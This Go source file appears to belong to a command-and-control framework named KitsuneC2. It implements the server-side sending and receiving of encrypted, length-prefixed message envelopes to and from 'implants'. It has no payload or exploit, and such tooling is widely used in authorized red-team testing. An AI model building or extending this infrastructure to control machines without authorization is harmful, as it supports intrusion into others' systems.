package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"net"
	"reflect"
)

func ReceiveEnvelopeFromImplant(connection net.Conn, aesKey []byte) (string, int, interface{}, error) {
	messageLengthAsBytes, err := communication.ReadFromSocket(connection, 4)
	if err != nil {
		return "", -1, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	messageContent, err := communication.ReadFromSocket(connection, int(messageLength))
	if err != nil {
		return "", -1, nil, err
	}

	implantId := string(messageContent[:32]) //the first 32 bytes of the message is the implantId.
	cipherText := messageContent[32:]        //the rest is ciphertext

	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, []byte(aesKey))
	if err != nil {
		return "", -1, nil, err
	}

	var messageEnvelope *communication.Envelope = new(communication.Envelope)
	json.Unmarshal(rawJsonAsBytes, messageEnvelope)

	dataAsStruct := communication.MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return "", -1, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return "", -1, nil, errors.New("data does not correspond to messageType")
	}

	return implantId, messageEnvelope.MessageType, dataAsStruct, nil
}

// This function is used by the server to communicate with an implant. Given a messageType and its contents, it wraps the data in an envelope
// datastructure and encrypts the content. It prepends the encrypted content with the length of the content so that the implant knows how many
// bytes to read from the connection.
func SendEnvelopeToImplant(connection net.Conn, messageType int, data interface{}, aesKey []byte) error {
	encryptedJson, err := communication.PackAndEncryptEnvelope(messageType, data, aesKey)
	if err != nil {
		return err
	}
	//create a buffer and write the len(encryptedData) + encryptedData into it
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)))
	buffer.Write(encryptedJson)

	err = communication.WriteToSocket(connection, buffer.Bytes())
	if err != nil {
		return err
	}

	return nil
}
